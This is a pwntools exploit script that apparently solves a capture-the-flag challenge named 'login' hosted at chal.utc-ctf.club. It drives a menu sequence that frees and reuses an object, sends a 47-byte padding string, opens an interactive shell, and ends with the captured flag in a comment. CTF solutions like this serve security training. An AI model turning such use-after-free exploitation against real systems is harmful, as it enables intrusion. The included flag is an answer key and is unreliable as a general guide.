from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./login')
else:
	host, port = "chal.utc-ctf.club", 13226
	r = remote(host, port)

raw_input('debug')
r.sendlineafter("> ", "1")
r.sendlineafter("Username: ", "linh")
r.sendlineafter("> ", "4")
r.sendlineafter("> ", "2")
r.sendlineafter("> ", "5")
r.sendlineafter("> ", "3")
fake_flag = 'a'*47
r.sendlineafter("instead?",fake_flag )
r.sendlineafter("> ", "3")

r.interactive()

#utc{I_sh0uldve_done_a_ref_counter!!}